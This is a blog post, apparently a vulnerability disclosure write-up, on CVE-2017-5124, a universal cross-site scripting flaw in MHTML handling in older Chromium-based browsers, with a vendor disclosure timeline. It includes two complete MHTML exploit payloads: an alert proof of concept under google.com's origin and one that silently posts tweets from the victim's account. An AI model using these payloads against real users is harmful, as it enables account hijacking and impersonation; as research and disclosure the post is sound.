---
layout: post
title: "Chromium Based Browsers are safe or not ? (English version)"
date: 2018-01-01 00:00:00.000000000 +07:00
type: post
published: true
status: publish
categories:
- Tutorials
tags:
- uxss
- chromium
excerpt: "n-day vulnerability in Chromium Based Browsers"
---
Original post: [https://develbranch.com/tutorials/chromium-based-browsers-are-safe-or-not.html](https://develbranch.com/tutorials/chromium-based-browsers-are-safe-or-not.html)


Recently, the Chromium open source browser (version 62 and below) has a very serious vulnerability. **UXSS with MHTML**, CVE-2017-5124. The exploit code has also been published: https://github.com/Bo0oM/CVE-2017-5124. 

## What is Universal Cross-site Scripting (UXSS)?
Cross-site scripting (XSS) (https://www.acunetix.com/websitesecurity/cross-site-scripting/) refers to client-side code injection attack wherein an attacker can execute malicious scripts (also commonly referred to as a malicious payload) into a legitimate website or web application. XSS is amongst the most rampant of web application vulnerabilities and occurs when a web application makes use of unvalidated or unencoded user input within the output it generates.

By leveraging XSS, an attacker does not target a victim directly. Instead, an attacker would exploit a vulnerability within a website or web application that the victim would visit, essentially using the vulnerable website as a vehicle to deliver a malicious script to the victim’s browser.

While XSS can be taken advantage of within VBScript, ActiveX and Flash (although now considered legacy or even obsolete), unquestionably, the most widely abused is JavaScript – primarily because JavaScript is fundamental to most browsing experiences.

Hackers use UXSS to access every open session of the browser: hackers can read the cookies or sessions of opened tabs.

# UXSS with MHTML (CVE-2017-5124)
This is a vulnerability in the Chromium when processing [MHTML (HTML)](https://en.wikipedia.org/wiki/MHTML).

MHTML is a text document with a title, content-type (multipart / related), and a content separator (boundary), encoding (can be base64).

In the description of html, we can use `Content-location` to determine the source of the data. For example, we write Content-location: https://example.com/abc, which will be loaded from https://example.com/abc and displayed.

For security reasons, all javascript related data is forbidden and can not be executed from another location. This rule is checked everywhere, except for [XSLT](https://en.wikipedia.org/wiki/XSLT).

```
MIME-Version: 1.0
Content-Type: multipart/related;
	type="text/html";
	boundary="----MultipartBoundary--"
CVE-2017-5124

------MultipartBoundary--
Content-Type: application/xml;

<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xml" href="#stylesheet"?>
<!DOCTYPE catalog [
<!ATTLIST xsl:stylesheet
id ID #REQUIRED>
]>
<xsl:stylesheet id="stylesheet" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="*">
<html><iframe style="display:none" src="https://google.com"></iframe></html>
</xsl:template>
</xsl:stylesheet>

------MultipartBoundary--
Content-Type: text/html
Content-Location: https://google.com

<script>alert('Location origin: '+location.origin)</script>
------MultipartBoundary----
```

The hacker can run alert () with the https://google.com domain and display a messagebox indicating the location corresponds to the script's running script.

## Some scenarios using UXSS with MHTML (CVE-2017-5124)
We will approach some "real" scenarios:
 * Hack email: Bad guys can read emails, send mail with the user's email address without their knowledge. Bank accounts are usually associated with an email address. If the email is compromised, the hacker will be able to read the account recovery codes or notifications from the bank, send fake emails or use this email to attack.
 * Hackers can read and post posts under user accounts. I will use my Twitter account for testing.
 
The exploit code will tweet a message with the user's Twitter account.

```
MIME-Version: 1.0
Content-Type: multipart/related;
	type="text/html";
	boundary="----MultipartBoundary--"
Become IDOL

------MultipartBoundary--
Content-Type: application/xml;

<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xml" href="#stylesheet"?>
<!DOCTYPE catalog [
<!ATTLIST xsl:stylesheet
id ID #REQUIRED>
]>
<xsl:stylesheet id="stylesheet" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="*">
<html><iframe style="display:none" src="https://twitter.com" ></iframe></html>
</xsl:template>
</xsl:stylesheet>

------MultipartBoundary--
Content-Type: text/html
Content-Location: https://twitter.com

<script>

function tweet(text)
{
    var win = window.open("/", '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=2, height=1, visible=none', '');
	win.onload = function(){
	        win.boxTextToTweet = win.document.getElementById("tweet-box-home-timeline");
			win.btnPostTweet = win.document.getElementsByClassName("tweet-action EdgeButton EdgeButton--primary js-tweet-btn")[0];
			win.boxTextToTweet.focus();
			win.boxTextToTweet.innerHTML = text;
			setTimeout(function(){ win.btnPostTweet.click(); }, 500);
			setTimeout(function(){ win.close(); }, 1500);
	}
}

tweet('I <3 fosec. @quangnh89 is my idol.');

</script>
------MultipartBoundary----
```

I have attacked CocCoc (66) and SamSung Internet browser.

Demo with CocCoc 66:

[![UXSS with MHTML (CVE-2017-5124) + CocCoc browser 66.4.134](https://img.youtube.com/vi/oBZe2-dtfGI/0.jpg)](https://www.youtube.com/watch?v=oBZe2-dtfGI)


## The browsers are affected by CVE-2017-5124
All browsers that use the Chromium (Chrome < 62) are affected. CocCoc version 66.4.134, a popular browser in Vietnam, which uses Chromium 60.4.3112.134 is vulnerable. Some browsers on SamSung phones made by the manufacturer itself can be exploited. Personally, for security purposes, we can temporarily stop using the browser until the problem is solved.

## Timeline
_Coc Coc Browser_
 * 05/12/2017: contacted CocCoc Company.
 * 06/12/2017: Coc Coc Company confirmed.
Currently, the latest version of CocCoc has been fixed.

_SamSung Internet Browser 6.2.01.12_ 
 * 03/12/2017: Send email to SamSung Company
 * 08/12/2017: SamSung thinks that this issue belongs to Google Chrome.

 
According to my tests, the browser SamSung Internet Browser 6.2.01.12 suffered a serious vulnerability. If your phone is not up to date, wait for a patch. Demo with SamSung internet: https://www.youtube.com/watch?v=nLPuplN5HmM

[![UXSS with MHTML (CVE-2017-5124) + SamSung Internet Browser 6.2.01.12](https://img.youtube.com/vi/nLPuplN5HmM/0.jpg)](https://www.youtube.com/watch?v=nLPuplN5HmM)
